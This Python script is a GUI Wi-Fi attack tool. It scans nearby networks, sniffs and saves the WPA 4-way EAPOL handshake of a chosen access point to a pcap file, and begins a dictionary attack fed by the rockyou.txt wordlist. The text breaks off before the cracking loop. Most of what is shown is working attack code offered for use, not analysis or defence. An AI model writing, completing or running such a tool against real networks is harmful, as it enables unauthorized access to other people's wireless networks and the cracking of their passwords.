#!/usr/bin/env python3

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, simpledialog
import threading
import queue
import platform
import sys
import os
import time
import subprocess
import ctypes



# Scapy setup
try:
    from scapy.config import conf
    conf.cache = False
except:
    pass


try:
    from scapy.all import sniff, Dot11, Dot11Beacon, RadioTap, EAPOL, wrpcap
except ImportError:
    root = tk.Tk()
    root.withdraw()
    messagebox.showerror("Error", "Scapy is not installed.\n\nRun:\npip install scapy")
    sys.exit(1)


# ================= CONFIG =================
SCAN_DURATION     = 20
CAPTURE_DURATION  = 90
OUTPUT_PCAP       = "handshake.pcap"
INTERFACE         = "wlan0"                    
MAX_WORKERS       = 8
ROCKYOU_PATH      = "rockyou.txt"
MAX_ROCKYOU_LINES = 100_000


stop_event   = threading.Event()
result_queue = queue.Queue()


# ─── Worker Functions ────────────────────────────────────────────────


def log_status(msg):
    result_queue.put(("status", msg))


def scan_wifi_windows():
    log_status("Windows Wi-Fi scan starting (netsh)...")
    try:
        out = subprocess.check_output(
            ["netsh", "wlan", "show", "networks", "mode=bssid"],
            text=True, stderr=subprocess.STDOUT
        )
        log_status("Scan results:\n" + out.strip())
    except Exception as e:
        log_status(f"Windows scan failed: {str(e)}")


def scan_thread(iface):
    log_status(f"Starting Linux scan on {iface}...")
    networks = {}
    try:
        def handler(pkt):
            if stop_event.is_set():
                return True
            if pkt.haslayer(Dot11Beacon):
                bssid = pkt[Dot11].addr3.upper()
                if bssid in networks:
                    return
                ssid = pkt[Dot11Beacon].info.decode('utf-8', errors='ignore') or "<hidden>"
                signal = getattr(pkt[RadioTap], "dBm_AntSignal", "N/A") if pkt.haslayer(RadioTap) else "N/A"
                networks[bssid] = {"ssid": ssid, "signal": signal}
                result_queue.put(("found", f"{ssid:<25} | {bssid} | {signal} dBm"))


        sniff(iface=iface, prn=handler, timeout=SCAN_DURATION, store=0)
        log_status("Scan finished")
    except Exception as e:
        log_status(f"Scan error: {str(e)}")


def capture_thread(iface, bssid, ssid):
    log_status(f"Starting handshake capture → {ssid} ({bssid})")
    packets = []
    count = [0]
    try:
        def handler(pkt):
            if stop_event.is_set():
                return True
            if pkt.haslayer(EAPOL):
                count[0] += 1
                packets.append(pkt)
                log_status(f"EAPOL packet {count[0]} captured")
                if count[0] >= 4:
                    log_status("Full 4-way handshake captured!")
                    return True
            return False


        sniff(iface=iface, prn=handler, timeout=CAPTURE_DURATION, store=0)


        if packets:
            wrpcap(OUTPUT_PCAP, packets)
            log_status(f"Handshake saved → {OUTPUT_PCAP}")
        else:
            log_status("No handshake captured in time")
    except Exception as e:
        log_status(f"Capture failed: {str(e)}")


def dictionary_attack_thread(ssid):
    log_status(f"Starting dictionary attack on {ssid}...")
    passwords = []


    if os.path.exists(ROCKYOU_PATH):
        log_status("Loading rockyou.txt...")
        try:
            with open(ROCKYOU_PATH, "r", encoding="utf-8", errors="ignore") as f:
                count = 0
                for line in f:
                    pwd = line.strip()
                    if pwd:
                        passwords.append(pwd)
                    count += 1
                    if count >= MAX_ROCKYOU_LINES:
                        break
            log_status(f"Loaded {len(passwords):,} passwords (limited)")
        except Exception as e:
            log_status(f"rockyou error → using demo list ({e})")
            passwords = ["123456", "password", "admin"]
    else:
        log_status("rockyou.txt not found → demo mode")
        passwords = ["123456", "password", "admin", "letmein", "qwerty"]


    total = len(passwords)
    log_status(f"Attacking with {total:,} passwords...")


    found = [False]
    tried = [0]

